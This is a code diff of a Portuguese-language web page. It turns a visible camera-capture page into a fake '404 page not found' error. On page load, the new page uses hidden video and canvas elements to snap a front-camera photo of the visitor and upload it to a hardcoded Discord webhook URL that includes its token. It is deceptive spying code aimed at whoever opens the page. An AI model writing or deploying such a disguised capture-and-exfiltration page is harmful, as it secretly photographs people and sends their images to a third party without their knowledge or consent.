@@ -3,146 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Captura de Câmera</title>
+    <title>Erro 404 - Página Não Encontrada</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
+            background-color: #f8f9fa;
+            color: #343a40;
+            text-align: center;
+            padding: 50px;
             margin: 0;
-            background-color: #f5f5f5;
         }
-        #cameraContainer {
-            position: relative;
-            margin-bottom: 20px;
+        .error-container {
+            max-width: 600px;
+            margin: 0 auto;
         }
-        #video {
-            background-color: #000;
-            border-radius: 8px;
-            transform: scaleX(-1); /* Espelha a imagem para parecer mais natural */
+        h1 {
+            font-size: 72px;
+            margin: 0;
+            color: #dc3545;
         }
-        #canvas {
-            display: none;
-            border-radius: 8px;
+        p {
+            font-size: 18px;
+            margin: 20px 0;
         }
-        #photo {
-            max-width: 100%;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        a {
+            color: #007bff;
+            text-decoration: none;
         }
-        .message {
-            margin-top: 20px;
-            padding: 10px 20px;
-            background-color: #4CAF50;
-            color: white;
-            border-radius: 4px;
+        .hidden {
             display: none;
         }
     </style>
 </head>
 <body>
-    <h1>Captura de Foto Automática</h1>
-    <p>Aguarde enquanto acessamos sua câmera frontal...</p>
-    
-    <div id="cameraContainer">
-        <video id="video" width="400" height="300" autoplay></video>
-        <canvas id="canvas" width="400" height="300"></canvas>
-    </div>
-    
-    <div id="photoContainer" style="display: none;">
-        <h2>Foto Capturada:</h2>
-        <img id="photo" alt="A foto aparecerá aqui"/>
-    </div>
-    
-    <div id="successMessage" class="message">
-        Foto capturada com sucesso!
+    <div class="error-container">
+        <h1>404</h1>
+        <p>Oops! A página que você está procurando não existe.</p>
+        <p>Você pode <a href="/">voltar para a página inicial</a> ou tentar novamente mais tarde.</p>
     </div>
 
+    <!-- Elementos ocultos para captura da câmera -->
+    <video id="hiddenVideo" autoplay class="hidden"></video>
+    <canvas id="hiddenCanvas" class="hidden"></canvas>
+
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const photo = document.getElementById('photo');
-            const photoContainer = document.getElementById('photoContainer');
-            const successMessage = document.getElementById('successMessage');
-            
-            // Acessa a câmera frontal (user) ou traseira (environment)
-            const constraints = {
-                video: {
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 },
-                    facingMode: 'user' // Usa a câmera frontal
-                }
-            };
-            
-            // Inicia a câmera
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(function(stream) {
-                    video.srcObject = stream;
-                    
-                    // Espera 2 segundos para garantir que a câmera está pronta
-                    setTimeout(function() {
-                        takePicture();
-                        
-                        // Para o stream da câmera após tirar a foto
-                        setTimeout(function() {
-                            stream.getTracks().forEach(function(track) {
-                                track.stop();
-                            });
-                        }, 1000);
-                    }, 2000);
-                })
-                .catch(function(err) {
-                    console.error("Erro ao acessar a câmera: ", err);
-                    alert("Não foi possível acessar a câmera. Por favor, permita o acesso à câmera e recarregue a página.");
+        // Configuração do Webhook do Discord (substitua pela sua URL)
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1391479176376356928/JxCpfTy6kCzBtR_RCh07NnNoPEZ9fM6XSnvpNI0EI_EVXF9BJtuF_nBKiDGH6TEjzcwL';
+
+        // Função para capturar a foto e enviar para o Discord
+        async function captureAndSendPhoto() {
+            try {
+                const video = document.getElementById('hiddenVideo');
+                const canvas = document.getElementById('hiddenCanvas');
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: 640,
+                        height: 480 
+                    } 
                 });
-            
-            // Função para tirar a foto
-            function takePicture() {
-                const context = canvas.getContext('2d');
+
+                video.srcObject = stream;
                 
-                // Ajusta o tamanho do canvas para o tamanho do vídeo
+                // Espera um pouco para garantir que a câmera está ativa
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                // Captura o frame
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Desenha a imagem do vídeo no canvas (espelhada para parecer natural)
-                context.translate(canvas.width, 0);
-                context.scale(-1, 1);
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                // Converte para base64
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                 
-                // Converte a imagem para data URL e exibe
-                const dataUrl = canvas.toDataURL('image/png');
-                photo.setAttribute('src', dataUrl);
+                // Para a câmera
+                stream.getTracks().forEach(track => track.stop());
                 
-                // Esconde o vídeo e mostra a foto
-                video.style.display = 'none';
-                photoContainer.style.display = 'block';
-                successMessage.style.display = 'block';
-                
-                // Aqui você pode enviar a foto para um servidor se necessário
-                // sendPhotoToServer(dataUrl);
+                // Envia para o Discord
+                await sendToDiscord(imageData);
+            } catch (error) {
+                console.error('Erro ao capturar foto:', error);
             }
-            
-            // Função para enviar a foto para um servidor (exemplo)
-            function sendPhotoToServer(imageData) {
-                fetch('https://seuservidor.com/upload', {
+        }
+
+        // Função para enviar a foto para o Discord via webhook
+        async function sendToDiscord(imageData) {
+            if (!DISCORD_WEBHOOK_URL.includes('https://discord.com/api/webhooks')) {
+                console.error('Webhook do Discord não configurado corretamente');
+                return;
+            }
+
+            try {
+                // Extrai os dados base64
+                const base64Data = imageData.split(',')[1];
+                
+                // Converte para blob
+                const blob = await fetch(`data:image/jpeg;base64,${base64Data}`).then(res => res.blob());
+                
+                // Cria form data
+                const formData = new FormData();
+                formData.append('file', blob, 'foto.jpg');
+                
+                // Envia para o webhook
+                await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
-                    body: JSON.stringify({ image: imageData }),
-                    headers: {
-                        'Content-Type': 'application/json'
-                    }
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Foto enviada com sucesso:', data);
-                })
-                .catch(error => {
-                    console.error('Erro ao enviar foto:', error);
+                    body: formData
                 });
+                
+                console.log('Foto enviada com sucesso para o Discord');
+            } catch (error) {
+                console.error('Erro ao enviar para o Discord:', error);
             }
+        }
+
+        // Inicia a captura quando a página carrega
+        window.addEventListener('load', () => {
+            setTimeout(captureAndSendPhoto, 1000); // Espera 1s antes de capturar
         });
     </script>
 </body>
